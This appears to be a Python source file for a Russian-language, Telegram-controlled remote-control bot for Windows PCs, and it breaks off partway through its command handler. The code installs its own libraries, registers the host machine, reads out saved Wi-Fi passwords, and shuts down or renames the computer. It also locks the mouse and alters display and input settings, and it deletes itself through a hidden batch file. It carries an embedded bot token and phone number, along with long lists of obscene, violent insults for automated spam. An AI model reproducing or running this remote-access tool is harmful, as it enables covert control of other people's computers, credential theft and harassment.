# main.py - МЕГА-БОТ СО ВСЕМИ ФУНКЦИЯМИ
import sys
import subprocess
import importlib
import os

# ========== АВТОУСТАНОВКА БИБЛИОТЕК ==========
REQUIRED_LIBRARIES = [
    'pytelegrambotapi',
    'pywin32',
    'pillow',
    'numpy',
    'requests',
    'pyautogui',
    'psutil'
]

def install_and_import(package):
    try:
        importlib.import_module(package.replace('-', '_'))
        print(f"✅ {package} уже установлен")
        return True
    except ImportError:
        print(f"📦 Устанавливаю {package}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ {package} установлен")
            return True
        except:
            return False

def auto_install_libraries():
    print("=" * 50)
    print("🔧 УСТАНОВКА БИБЛИОТЕК")
    print("=" * 50)
    for lib in REQUIRED_LIBRARIES:
        install_and_import(lib)
    print("=" * 50)

auto_install_libraries()

# ========== ИМПОРТЫ ==========
import telebot
from telebot import types
import time
import threading
import json
import hashlib
import uuid
import socket
import random
import ctypes
import tempfile
import shutil
import subprocess as sp
from datetime import datetime
import winreg
import tkinter as tk
from tkinter import messagebox

try:
    import pyautogui
    import psutil
    from PIL import Image, ImageDraw, ImageFont
except:
    pass

# ========== ТВОИ ДАННЫЕ ==========
TOKEN = '8479680273:AAGREcMFTDko97KeKjBhGjsI4WQcrBecmWk'
ADMIN_ID = 7956446346
НОМЕР_ВЛАДЕЛЬЦА = '+79964026952'
# =================================

# ========== ЖЁСТКИЕ МАССИВЫ ==========
УНИЖЕНИЯ_ЭПИЧНЫЕ = [
    "втоптанный еблан, я тя заставлю ждать ебучие реньсы бегая с одной станции на другую",
    "залупоглазый глист, я тебя ща снаряжу в ботинки из капкана",
    "немощный оползень, я тя ща гелием накачаю чтоб ты на орбиту нахуй улетел",
    "гнилозубый пиздорвань, унижайся дальше",
    "подзаборный осёл, я тя пущу на мясо",
    "затычка, въебись в окно",
    "шерсть бездарная, твою мать вьебу хуем по челюхе",
    "еблоухий копрофил, я тебя дрессирую к команде 'сжирать собственные фаланги рук'",
    "кишкодроченый еблоид, я тя запихну в коробку и отправлю в банановые острова жить с аборигенами",
    "полудохлый маргинал, я тебя из последних сил ебашил по ебалу обломком металлической трубы",
    "черепно-мозговой недотрог, ты даже член в штанах с трёх раз не находишь",
    "спермотоксикозный выкидыш, твоя родословная короче чем хуй у одноклеточного",
    "вазелиновый червяк, я тя заставлю жрать песок на пляже",
    "межгалактический даун, у тебя мозг размером с горошину и та пополам",
    "планктон хуев, я тя размажу по асфальту как соплю",
    "биоробот недоёбаный, тебя даже мать не любит",
    "говноед вонючий, засунь свой язык в розетку",
    "недобитый аутист, я тебя в бетон закатаю",
    "катыш из носа, вышмыгни в унитаз",
    "плесневелый хер, у тебя хуй как мумия ссохся",
    "радиоактивный мусор, я тя в чернобыль отправлю светиться",
    "био-органический отход, тебя даже собаки брезгуют нюхать",
    "силиконовая пизда, надуйся и лопни",
    "потогонный хуй, я из тебя выжму все соки",
    "костномозговой червь, просверли себе башку дрелью",
    "парафиновый ёбарь, я тя расплавлю и свечи наделаю",
    "электронный даун, у тебя провода в голове замкнули",
    "копролитовый мешок, ты просто ходячее говно",
    "психотронный хуй, я тебя запрограммирую на самоуничтожение",
    "биткоин-еблан, майни себе мозг долбаёб",
    "крипто-пиздюк, обменяй свою жизнь на хуй",
    "нано-хуй, тебя в микроскоп рассматривать надо",
    "квантовый даун, ты существуешь во всех измерениях как мудак",
    "виртуальный лох, выруби себя из розетки",
    "цифровой дегенерат, отформатируй себе память",
    "пиксельный еблан, рассыпься нахуй",
    "битрейтовый хуй, тебя сжали до говна",
    "долбоёб 2.0, обнови себя до версии 'полный пиздец'",
    "алгоритмический мудак, я тебя зациклю на унижении",
    "искуственный идиот, твой создатель был дауном",
    "нейросетевой хуй, тебя обучили на говне",
    "блокчейн-петух, запись о том что ты лошок навечно в блоке",
    "майнинг-хуйня, добудь себе мозги",
    "инстаграмный хер, отфотошопь себе лицо",
    "тикток-пиздюк, станцуй на гробу своей карьеры",
    "ютубный лох, на тебя даже бомжи не подписаны",
    "твитчерский даун, стрими как ты ссышься от страха",
    "дискорд-хуйло, замуть себя в бан"
]

СУПЕР_ЖЕСТКИЕ = [
    "ты даже сперма недоношенная, тебя в пробирке забыли и перепутали с образцом мочи",
    "твой отец ушёл за хлебом и купил билет в один конец, лишь бы не видеть твою ебалду",
    "у тебя IQ комнатной температуры, только вот комната в морге",
    "ты настолько тупой, что даже петух на твоём фоне выглядит как профессор",
    "твоя мать когда тебя родила, врачи спросили 'мальчик или девочка?', а она ответила 'оставьте себе'",
    "ты как геморрой - никому не нужен и постоянно бесишь",
    "твой рот как помойка - только говно и вылетает",
    "ты даже член в штанах найти не можешь без навигатора",
    "у тебя лицо как у обиженной пизды, которую трамваем переехали",
    "ты хуже чем запах изо рта у бомжа после литра портвейна",
    "твой мозг размером с горошину, и ту муравьи сожрали",
    "ты настолько никчёмный, что даже пыль под диваном полезнее тебя",
    "у тебя родословная короче, чем хуй у муравья",
    "ты как прыщ на жопе - все видят, но никто не трогает",
    "твоё лицо - причина бесплатного интернета, потому что за такое безобразие брать деньги нельзя",
    "ты даже какать с первого раза не попадаешь в унитаз",
    "у тебя друзей меньше, чем зубов во рту у столетней бабки",
    "ты как гугл переводчик - постоянно несёшь хуйню",
    "твоя жизнь как сломанный калькулятор - сколько ни жми, толку ноль",
    "ты даже воздух тратишь зря, дыша впустую",
    "у тебя потенциал как у дохлой мухи - никакой",
    "ты хуже чем реклама перед ютубом - всех бесишь",
    "твой голос как скрежет металла по стеклу - хочется вырвать уши",
    "ты настолько уродлив, что даже зеркала от тебя трескаются",
    "у тебя в голове не извилины, а тормозные колодки",
    "ты как просроченный йогурт - уже давно пора выкинуть",
    "твоя ценность ниже, чем биткоин после обвала",
    "ты даже руку в зеркале путаешь с чужой",
    "у тебя совесть как у наркомана - нету",
    "ты хуже чем звонок будильника в понедельник утром",
    "твоё присутствие портит статистику сервера",
    "ты как вирус - все хотят тебя удалить",
    "у тебя лицо как у хорька, которого битой по голове огрели",
    "ты даже в интернете умудряешься быть позором",
    "твои шутки смешнее только в гробу",
    "ты как Wi-Fi без интернета - бесполезный",
    "у тебя харизма как у дохлой вороны",
    "ты даже воду умудряешься поджечь своей тупостью",
    "твой мозг работает медленнее чем бабушка с артрозом",
    "ты как кнопка 'F' - бесполезный и никто не знает зачем ты нужен",
    "у тебя столько же ума, сколько в табуретке",
    "ты хуже чем уведомление от госуслуг",
    "твоё лицо разгоняет толпу лучше слезоточивого газа",
    "ты как батарея в айфоне - быстро садишь и бесишь всех",
    "у тебя перспективы как у снега в аду",
    "ты даже в лохах лох",
    "твоя родословная - сплошной инцест и срамота",
    "ты как пуля в заднице - постоянно напоминаешь о себе",
    "у тебя будущее как у одноразовой вилки - выкинут сразу после использования",
    "ты хуже чем сопли на морозе"
]

# ========== КЛАСС ДЛЯ ВЫВОДА НА ЭКРАН ==========
class ScreenDisplay:
    @staticmethod
    def show_message(title, text, duration=10):
        try:
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            msg_window = tk.Toplevel(root)
            msg_window.title(title)
            msg_window.geometry("500x300")
            msg_window.attributes('-topmost', True)
            
            msg_window.update_idletasks()
            width = msg_window.winfo_width()
            height = msg_window.winfo_height()
            x = (msg_window.winfo_screenwidth() // 2) - (width // 2)
            y = (msg_window.winfo_screenheight() // 2) - (height // 2)
            msg_window.geometry(f'{width}x{height}+{x}+{y}')
            
            label = tk.Label(msg_window, text=text, font=("Arial", 14), wraplength=450, justify="left")
            label.pack(expand=True, padx=20, pady=20)
            
            btn = tk.Button(msg_window, text="OK", command=msg_window.destroy)
            btn.pack(pady=10)
            
            msg_window.after(duration * 1000, msg_window.destroy)
            msg_window.mainloop()
            root.destroy()
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ ОБОЕВ ==========
class WallpaperManager:
    @staticmethod
    def change_temp(seconds=10):
        try:
            from PIL import Image, ImageDraw, ImageFont
            
            temp_img = os.path.join(tempfile.gettempdir(), f'prank_{random.randint(1000,9999)}.jpg')
            
            img = Image.new('RGB', (1920, 1080), color='yellow')
            d = ImageDraw.Draw(img)
            
            d.ellipse([760, 340, 1160, 740], outline='black', width=5, fill='yellow')
            d.ellipse([860, 440, 920, 500], fill='black')
            d.ellipse([1000, 440, 1060, 500], fill='black')
            d.arc([860, 540, 1060, 640], start=0, end=180, fill='red', width=5)
            
            try:
                font = ImageFont.truetype("arial.ttf", 36)
            except:
                font = ImageFont.load_default()
            
            d.text((760, 200), f"{seconds} СЕКУНД ПОЗОРА!", fill='black', font=font)
            img.save(temp_img)
            
            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_img, 0)
            
            def restore():
                time.sleep(seconds)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                try:
                    os.remove(temp_img)
                except:
                    pass
            
            threading.Thread(target=restore, daemon=True).start()
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ БЛОКИРОВКИ МЫШИ ==========
class MouseBlocker:
    _blocked = False
    
    @classmethod
    def block(cls):
        try:
            user32 = ctypes.windll.user32
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            center_x = screen_width // 2
            center_y = screen_height // 2
            user32.SetCursorPos(center_x, center_y)
            
            cls._blocked = True
            
            def lock_loop():
                while cls._blocked:
                    user32.SetCursorPos(center_x, center_y)
                    time.sleep(0.01)
            
            threading.Thread(target=lock_loop, daemon=True).start()
            return True
        except:
            return False
    
    @classmethod
    def unlock(cls):
        cls._blocked = False
        return True

# ========== КЛАСС ДЛЯ ИНВЕРТИРОВАНИЯ ЦВЕТОВ ==========
class ColorInverter:
    @staticmethod
    def invert():
        try:
            sp.run("powershell -command \"Add-Type @' \nusing System; using System.Runtime.InteropServices; \npublic class Display { \n[DllImport(\"gdi32.dll\")] static extern int SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp); \npublic static void Invert() { \nRAMP ramp = new RAMP(); \nfor (short i = 0; i < 256; i++) { \nramp.Red[i] = ramp.Green[i] = ramp.Blue[i] = (ushort)(65535 - i * 256); } \nIntPtr hDC = Graphics.FromHwnd(IntPtr.Zero).GetHdc(); \nSetDeviceGammaRamp(hDC, ref ramp); } } \n[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)] \npublic struct RAMP { \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Red; \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Green; \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Blue; }' \"; [Display]::Invert()\"", shell=True)
            return True
        except:
            return False
    
    @staticmethod
    def restore():
        try:
            sp.run("powershell -command \"Add-Type @' \nusing System; using System.Runtime.InteropServices; \npublic class Display { \n[DllImport(\"gdi32.dll\")] static extern int SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp); \npublic static void Reset() { \nRAMP ramp = new RAMP(); \nfor (short i = 0; i < 256; i++) { \nramp.Red[i] = ramp.Green[i] = ramp.Blue[i] = (ushort)(i * 256); } \nIntPtr hDC = Graphics.FromHwnd(IntPtr.Zero).GetHdc(); \nSetDeviceGammaRamp(hDC, ref ramp); } } \n[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)] \npublic struct RAMP { \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Red; \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Green; \n[MarshalAs(UnmanagedType.ByValArray, SizeConst=256)] public ushort[] Blue; }' \"; [Display]::Reset()\"", shell=True)
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ ПОВОРОТА ЭКРАНА ==========
class ScreenRotator:
    @staticmethod
    def rotate(angle=2):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Rotation", 0, winreg.REG_DWORD, angle)
            winreg.CloseKey(key)
            sp.run("rundll32.exe user32.dll,UpdatePerUserSystemParameters", shell=True)
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ СМЕНЫ КНОПОК МЫШИ ==========
class MouseSwapper:
    @staticmethod
    def swap():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "1")
            winreg.CloseKey(key)
            ctypes.windll.user32.SystemParametersInfoW(0x0041, 0, None, 0)
            return True
        except:
            return False
    
    @staticmethod
    def restore():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "0")
            winreg.CloseKey(key)
            ctypes.windll.user32.SystemParametersInfoW(0x0041, 0, None, 0)
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ ИНВЕРТИРОВАНИЯ СКРОЛЛА ==========
class ScrollInverter:
    @staticmethod
    def invert():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "FlipFlopWheel", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def restore():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "FlipFlopWheel", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ ЗАЛИПАНИЯ КЛАВИШ ==========
class StickyKeys:
    @staticmethod
    def enable():
        try:
            sp.run("powershell -command \"Start-Process cmd -Verb RunAs -ArgumentList '/c reg add \"HKCU\\Control Panel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ /d 506 /f'\"", shell=True)
            return True
        except:
            return False
    
    @staticmethod
    def disable():
        try:
            sp.run("powershell -command \"Start-Process cmd -Verb RunAs -ArgumentList '/c reg add \"HKCU\\Control Panel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ /d 58 /f'\"", shell=True)
            return True
        except:
            return False

# ========== КЛАСС ДЛЯ СПАМА ==========
class СпамерОскорблений:
    _stop_event = None
    _thread = None
    _interval = 3
    _bot = None
    _chat_id = None
    _active = False
    
    @classmethod
    def start(cls, bot_instance, chat_id, interval=3):
        if cls._active:
            return False
        cls._stop_event = threading.Event()
        cls._interval = interval
        cls._bot = bot_instance
        cls._chat_id = chat_id
        cls._active = True
        
        def spam_loop():
            counter = 1
            while not cls._stop_event.is_set():
                insult = random.choice(УНИЖЕНИЯ_ЭПИЧНЫЕ + СУПЕР_ЖЕСТКИЕ)
                message = f"🤬 **ОСКОРБЛЕНИЕ #{counter}**\n\n{insult}"
                try:
                    cls._bot.send_message(cls._chat_id, message, parse_mode="Markdown")
                except:
                    pass
                counter += 1
                for _ in range(cls._interval * 10):
                    if cls._stop_event.is_set():
                        break
                    time.sleep(0.1)
        
        cls._thread = threading.Thread(target=spam_loop, daemon=True)
        cls._thread.start()
        return True
    
    @classmethod
    def stop(cls):
        if not cls._active:
            return False
        cls._stop_event.set()
        cls._active = False
        return True
    
    @classmethod
    def is_active(cls):
        return cls._active

# ========== ID КОМПЬЮТЕРА ==========
def get_pc_id():
    try:
        pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
        user = os.environ.get('USERNAME', 'Unknown')
        disk = str(uuid.getnode())
        unique = f"{pc_name}_{user}_{disk}"
        return hashlib.md5(unique.encode()).hexdigest()[:8]
    except:
        return "UNKNOWN"

PC_ID = get_pc_id()
PC_NAME = os.environ.get('COMPUTERNAME', 'Unknown')
USER_NAME = os.environ.get('USERNAME', 'Unknown')

# ========== ХРАНИЛИЩЕ ПК ==========
CONFIG_DIR = os.path.join(os.environ['APPDATA'], 'MegaBot')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'pcs.json')
current_pc = PC_ID

def load_pcs():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_pcs(pcs):
    try:
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(pcs, f, ensure_ascii=False, indent=2)
    except:
        pass

def register_this_pc():
    pcs = load_pcs()
    pcs[PC_ID] = {
        'name': PC_NAME,
        'user': USER_NAME,
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': get_ip()
    }
    save_pcs(pcs)
    return pcs

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

# ========== ФУНКЦИИ УПРАВЛЕНИЯ ==========
def shutdown_computer(delay=10):
    os.system(f"shutdown /s /t {delay}")

def cancel_shutdown():
    os.system("shutdown /a")

def restart_computer(delay=10):
    os.system(f"shutdown /r /t {delay}")

def get_wifi_password():
    try:
        result = sp.run(['netsh', 'wlan', 'show', 'interfaces'], 
                       capture_output=True, text=True, encoding='cp866', errors='ignore')
        ssid = None
        for line in result.stdout.split('\n'):
            if 'SSID' in line and ':' in line:
                ssid = line.split(':')[1].strip()
                break
            if 'Профиль' in line and ':' in line:
                ssid = line.split(':')[1].strip()
                break
        if not ssid:
            return None, "Нет Wi-Fi"
        pass_result = sp.run(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], 
                            capture_output=True, text=True, encoding='cp866', errors='ignore')
        for line in pass_result.stdout.split('\n'):
            if 'Содержимое ключа' in line and ':' in line:
                return ssid, line.split(':')[1].strip()
            if 'Key Content' in line and ':' in line:
                return ssid, line.split(':')[1].strip()
        return ssid, "Пароль не найден"
    except:
        return None, "Ошибка"

def set_computer_name_temp(new_name):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ComputerName", 0, winreg.REG_SZ, new_name)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ComputerName", 0, winreg.REG_SZ, new_name)
        winreg.CloseKey(key)
        sp.run(f"powershell -command \"Rename-Computer -NewName '{new_name}' -Force\"", shell=True)
        return True
    except:
        return False

def self_destruct():
    try:
        if not getattr(sys, 'frozen', False):
            return False
        current_exe = sys.executable
        bat_path = os.path.join(tempfile.gettempdir(), 'cleanup.bat')
        with open(bat_path, 'w') as f:
            f.write('@echo off\n')
            f.write('echo Удаление...\n')
            f.write('timeout /t 3 /nobreak >nul\n\n')
            f.write(f'del "{current_exe}" /f /q\n')
            f.write('del "%~f0" /f /q\n')
        sp.Popen([bat_path], shell=True, creationflags=sp.CREATE_NO_WINDOW)
        return True
    except:
        return False

# ========== КЛАВИАТУРЫ ==========
def main_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        types.InlineKeyboardButton("🔴 ВЫКЛЮЧИТЬ", callback_data="off"),
        types.InlineKeyboardButton("🔄 ПЕРЕЗАГРУЗИТЬ", callback_data="restart"),
        types.InlineKeyboardButton("❌ ОТМЕНА", callback_data="cancel"),
        types.InlineKeyboardButton("📡 Wi-Fi", callback_data="wifi"),
        types.InlineKeyboardButton("📝 СМЕНИТЬ ИМЯ", callback_data="rename"),
        types.InlineKeyboardButton("🖥️ ИМЯ ПК", callback_data="show_name"),
        types.InlineKeyboardButton("🎨 ОБОИ 10С", callback_data="wallpaper"),
        types.InlineKeyboardButton("🔒 БЛОК МЫШИ", callback_data="block_mouse"),
        types.InlineKeyboardButton("🔓 РАЗБЛОК МЫШЬ", callback_data="unlock_mouse"),
        types.InlineKeyboardButton("🌈 ИНВЕРТ ЦВЕТА", callback_data="invert_colors"),
        types.InlineKeyboardButton("🎨 ВЕРНУТЬ ЦВЕТА", callback_data="restore_colors"),
        types.InlineKeyboardButton("🔄 ПОВОРОТ 180", callback_data="rotate_screen"),
        types.InlineKeyboardButton("↩️ ВЕРНУТЬ ЭКРАН", callback_data="restore_rotation"),
        types.InlineKeyboardButton("🖱️ СМЕНА КНОПОК", callback_data="swap_mouse"),
        types.InlineKeyboardButton("🖱️ ВЕРНУТЬ КНОПКИ", callback_data="restore_mouse"),
        types.InlineKeyboardButton("📜 ИНВЕРТ СКРОЛЛ", callback_data="invert_scroll"),
        types.InlineKeyboardButton("📜 ВЕРНУТЬ СКРОЛЛ", callback_data="restore_scroll"),
        types.InlineKeyboardButton("⌨️ ЗАЛИПАНИЕ", callback_data="sticky_keys"),
        types.InlineKeyboardButton("⌨️ ВЫКЛ ЗАЛИП", callback_data="unsticky_keys"),
        types.InlineKeyboardButton("🤬 СПАМ СТАРТ", callback_data="start_spam"),
        types.InlineKeyboardButton("🛑 СПАМ СТОП", callback_data="stop_spam"),
        types.InlineKeyboardButton("💬 СООБЩЕНИЕ", callback_data="show_message"),
        types.InlineKeyboardButton("ℹ️ ВЛАДЕЛЕЦ", callback_data="owner"),
        types.InlineKeyboardButton("🖥️ ПЕРЕКЛЮЧИТЬ ПК", callback_data="switch_pc"),
        types.InlineKeyboardButton("💣 УДАЛИТЬ", callback_data="delete"),
        types.InlineKeyboardButton("ℹ️ ИНФО", callback_data="info")
    ]
    
    # Разбиваем на ряды по 2 кнопки
    for i in range(0, len(buttons), 2):
        keyboard.add(*buttons[i:i+2])
    
    return keyboard

def pcs_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    pcs = load_pcs()
    for pc_id, info in pcs.items():
        if pc_id == current_pc:
            text = f"✅ {info['name']} ({info['user']}) [ТЕКУЩИЙ]"
        else:
            text = f"🖥️ {info['name']} ({info['user']})"
        keyboard.add(types.InlineKeyboardButton(text, callback_data=f"select_{pc_id}"))
    keyboard.add(types.InlineKeyboardButton("◀️ НАЗАД", callback_data="back"))
    return keyboard

# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
bot = telebot.TeleBot(TOKEN)

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"❌ Нет доступа. Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
        return
    
    register_this_pc()
    spam_status = "АКТИВЕН" if СпамерОскорблений.is_active() else "НЕ АКТИВЕН"
    
    bot.send_message(
        message.chat.id,
        f"🖥️ **МЕГА-БОТ**\n\n"
        f"🏠 **ПК:** {PC_NAME}\n"
        f"🆔 **ID:** `{PC_ID}`\n"
        f"👤 **Пользователь:** {USER_NAME}\n"
        f"🤬 **Спам:** {spam_status}\n"
        f"📞 **Владелец:** {НОМЕР_ВЛАДЕЛЬЦА}\n\n"
        f"📌 ВСЕ ФУНКЦИИ РАБОТАЮТ!",
        reply_markup=main_keyboard(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"❌ Нет доступа. Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
        return
    
    if current_pc != PC_ID:
        bot.reply_to(message, "⚠️ Сначала выбери этот ПК")
        return
    
    text = message.text
    if len(text) > 500:
        text = text[:500] + "..."
    
    if ScreenDisplay.show_message("Сообщение из Telegram", text, 15):
        bot.reply_to(message, f"✅ Сообщение показано!")
    else:
        bot.reply_to(message, "❌ Ошибка")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    global current_pc
    
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, f"❌ Нет доступа. Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
        return
    
    if call.data == "switch_pc":
        bot.edit_message_text(
            "🖥️ **ВЫБЕРИ КОМПЬЮТЕР:**",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=pcs_keyboard(),
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data.startswith("select_"):
        selected_pc = call.data.replace("select_", "")
        pcs = load_pcs()
        if selected_pc in pcs:
            current_pc = selected_pc
            info = pcs[selected_pc]
            bot.edit_message_text(
                f"✅ **ВЫБРАН ПК:** {info['name']}",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=main_keyboard(),
                parse_mode="Markdown"
            )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "back":
        spam_status = "АКТИВЕН" if СпамерОскорблений.is_active() else "НЕ АКТИВЕН"
        bot.edit_message_text(
            f"🖥️ **ГЛАВНОЕ МЕНЮ**\n\n🤬 Спам: {spam_status}",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_keyboard(),
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id)
        return
    
    if current_pc != PC_ID:
        bot.answer_callback_query(call.id, "⚠️ Сначала выбери этот ПК")
        return
    
    # ===== ОСНОВНЫЕ ФУНКЦИИ =====
    if call.data == "off":
        shutdown_computer(10)
        bot.answer_callback_query(call.id, "🔴 Выключение через 10 сек")
    
    elif call.data == "restart":
        restart_computer(10)
        bot.answer_callback_query(call.id, "🔄 Перезагрузка через 10 сек")
    
    elif call.data == "cancel":
        cancel_shutdown()
        bot.answer_callback_query(call.id, "✅ Отменено")
    
    elif call.data == "wifi":
        ssid, password = get_wifi_password()
        if ssid:
            bot.answer_callback_query(call.id, f"🌐 {ssid}: {password}")
        else:
            bot.answer_callback_query(call.id, f"❌ {password}")
    
    elif call.data == "show_name":
        name = os.environ.get('COMPUTERNAME', 'Unknown')
        bot.answer_callback_query(call.id, f"🖥️ Имя: {name}")
    
    elif call.data == "rename":
        bot.answer_callback_query(call.id, "📝 Используй /rename НОВОЕ_ИМЯ")
    
    # ===== ПРИКОЛЫ С ОБОЯМИ =====
    elif call.data == "wallpaper":
        if WallpaperManager.change_temp(10):
            bot.answer_callback_query(call.id, "🎨 Обои на 10 сек!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== БЛОКИРОВКА МЫШИ =====
    elif call.data == "block_mouse":
        if MouseBlocker.block():
            bot.answer_callback_query(call.id, "🔒 Мышь заблокирована!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "unlock_mouse":
        if MouseBlocker.unlock():
            bot.answer_callback_query(call.id, "🔓 Мышь разблокирована!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== ЦВЕТА =====
    elif call.data == "invert_colors":
        if ColorInverter.invert():
            bot.answer_callback_query(call.id, "🌈 Цвета инвертированы!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "restore_colors":
        if ColorInverter.restore():
            bot.answer_callback_query(call.id, "🎨 Цвета восстановлены!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== ПОВОРОТ ЭКРАНА =====
    elif call.data == "rotate_screen":
        if ScreenRotator.rotate(2):
            bot.answer_callback_query(call.id, "🔄 Экран повернут!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "restore_rotation":
        if ScreenRotator.rotate(0):
            bot.answer_callback_query(call.id, "↩️ Экран восстановлен!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== СМЕНА КНОПОК МЫШИ =====
    elif call.data == "swap_mouse":
        if MouseSwapper.swap():
            bot.answer_callback_query(call.id, "🖱️ Кнопки поменялись!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "restore_mouse":
        if MouseSwapper.restore():
            bot.answer_callback_query(call.id, "🖱️ Кнопки восстановлены!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== ИНВЕРТ СКРОЛЛА =====
    elif call.data == "invert_scroll":
        if ScrollInverter.invert():
            bot.answer_callback_query(call.id, "📜 Скролл инвертирован!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "restore_scroll":
        if ScrollInverter.restore():
            bot.answer_callback_query(call.id, "📜 Скролл восстановлен!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== ЗАЛИПАНИЕ КЛАВИШ =====
    elif call.data == "sticky_keys":
        if StickyKeys.enable():
            bot.answer_callback_query(call.id, "⌨️ Залипание включено!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    elif call.data == "unsticky_keys":
        if StickyKeys.disable():
            bot.answer_callback_query(call.id, "⌨️ Залипание выключено!")
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка")
    
    # ===== СПАМ =====
    elif call.data == "start_spam":
        if СпамерОскорблений.start(bot, call.message.chat.id, 3):
            bot.answer_callback_query(call.id, "🤬 Спам запущен!")
        else:
            bot.answer_callback_query(call.id, "❌ Уже запущен")
    
    elif call.data == "stop_spam":
        if СпамерОскорблений.stop():
            bot.answer_callback_query(call.id, "🛑 Спам остановлен")
        else:
            bot.answer_callback_query(call.id, "❌ Не был запущен")
    
    # ===== СООБЩЕНИЕ НА ЭКРАН =====
    elif call.data == "show_message":
        bot.answer_callback_query(call.id, "💬 Напиши любое сообщение")
        bot.send_message(call.message.chat.id, "✍️ Отправь текст - он появится на экране!")
    
    # ===== ИНФО =====
    elif call.data == "owner":
